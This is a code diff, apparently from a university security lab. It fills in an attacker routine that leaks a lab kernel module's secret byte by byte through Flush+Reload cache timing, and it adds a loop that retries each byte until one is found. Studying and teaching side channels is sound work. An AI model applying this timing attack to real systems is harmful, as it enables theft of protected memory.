@@ -44,6 +44,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     uint64_t dram_latency_bf,dram_latency;
     volatile char load_shared_mem;
 
+    int repeat;
+    int same_twice;
+
     printf("Launching attacker\n");
 
     //Flushing the memory here
@@ -57,22 +60,28 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+        repeat = 1;
 
-        // [Part 2]- Fill this in!
+        // [Part 1]- Fill this in!
+        // Feel free to create helper methods as necessary.
+        // Use "call_kernel_part1" to interact with the kernel module
+        // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 
-        //Use call kernel to access data
-        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+        while (repeat)
+        {
+            /* code */
+            //Use call kernel to access data
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
-        //Reload and measure time and Decode the transmission to get data
-        for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
-            dram_latency = time_access((void*)(shared_memory+flush_offset));
-            clflush((void*)(shared_memory+flush_offset));
-            //printf("\n This is the cache line access latency: %li", dram_latency);
-            if (dram_latency < 70){
-                leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
-                //printf("\n This is the char we leaked %li, %li", dram_latency, (flush_offset/4096));
-                //break;
+            //Reload and measure time and Decode the transmission to get data
+            for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
+                dram_latency = time_access((void*)(shared_memory+flush_offset));
+                clflush((void*)(shared_memory+flush_offset));
+                if (dram_latency < 70){
+                    leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
+                    repeat = 0;
+                }
             }
         }
 
